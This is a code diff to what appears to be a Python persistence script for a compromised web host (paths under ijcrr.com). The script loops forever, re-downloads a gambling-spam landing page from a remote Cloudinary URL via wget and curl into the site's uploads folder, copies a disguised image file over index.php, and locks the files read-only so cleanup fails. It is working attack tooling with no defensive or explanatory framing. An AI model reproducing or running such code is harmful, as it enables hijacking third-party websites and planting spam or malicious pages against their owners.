@@ -17,18 +17,26 @@ xG = '\033[92m'
 
 ### SATPAM LANDING PAGE
 dirs = "/home/u845032518/domains/ijcrr.com/public_html/uploads/"
-index = "/home/u845032518/domains/ijcrr.com/public_html/uploads/index.php"
+#LP = "/home/u845032518/domains/ijcrr.com/public_html/uploads/index.php"
 sourcemv = "/home/u845032518/domains/ijcrr.com/public_html/home/slider/05.jpg"
 sourceget = "https://res.cloudinary.com/toolar/raw/upload/v1651397825/tool/ijcrr._v05hq1.txt"
 def cronWar():
     while True:
         d = os.path.isdir(dirs) 
         if d == True:
-            #bc = backconnect
-            v = os.path.exists(index)
+            os.system("chmod 755 '%s'" % dirs)
+            index = dirs + "index.html"
+            indexx = dirs + "index.php"
+            v = os.path.exists(indexx)
             if v == False:
-                os.system("cp '%s' '%s'" % (sourcemv, index))
-                os.system("wget -qO '%s' '%s'" % (index, sourceget))
+                os.system("chmod 755 '%s'" % index)
+                os.system("chmod 755 '%s'" % indexx)
+                os.system("cp '%s' '%s'" % (index, indexx))
+                os.system("cp '%s' '%s'" % (sourcemv, indexx))
+                os.system("wget -qO '%s' '%s'" % (indexx, sourceget))
+                os.system("curl --silent '%s' -o '%s'" % (sourceget, indexx))
+                os.system("chmod 444 '%s'" % index)
+                os.system("chmod 444 '%s'" % indexx)
                 pass
                 
             x1 = ["https://bit.ly/daftaralo","https://bit.ly/daftarhub88","JOKER123","Joker123"]
@@ -40,8 +48,13 @@ def cronWar():
                     print("{}[!] {}LP not detect").format(xR,xW)
                     print("{}[*] {}creating file...").format(xC,xW)
                     os.system("chmod 755 '%s'" % index)
-                    os.system("wget -qO '%s' '%s'" % (index, sourceget))
+                    os.system("chmod 755 '%s'" % indexx)
+                    os.system("cp '%s' '%s'" % (index, indexx))
+                    os.system("cp '%s' '%s'" % (sourcemv, indexx))
+                    os.system("wget -qO '%s' '%s'" % (indexx, sourceget))
+                    os.system("curl --silent '%s' -o '%s'" % (sourceget, indexx))
                     os.system("chmod 444 '%s'" % index)
+                    os.system("chmod 444 '%s'" % indexx)
                     pass
 
         else:
